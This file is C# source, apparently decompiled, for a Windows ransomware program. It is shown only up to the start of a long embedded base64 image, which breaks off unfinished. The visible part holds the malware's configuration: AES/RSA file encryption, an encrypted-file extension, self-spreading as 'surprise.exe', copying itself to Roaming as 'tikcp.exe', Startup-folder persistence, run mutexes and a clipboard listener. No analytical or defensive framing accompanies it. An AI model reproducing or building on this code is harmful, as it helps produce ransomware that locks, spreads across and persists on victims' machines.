using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "tikcp.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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